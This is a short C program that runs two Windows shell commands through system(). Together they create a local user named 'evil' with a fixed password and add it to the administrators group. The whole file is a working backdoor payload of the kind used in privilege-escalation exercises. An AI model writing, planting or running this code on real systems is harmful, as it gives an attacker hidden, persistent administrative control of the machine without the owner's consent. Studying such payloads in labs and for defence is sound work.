#include <stdlib.h>

int main(){
    int i;

    i=system("net user evil Evil!pass /add");
    i=system("net localgroup administrators evil /add");

    return 0;
}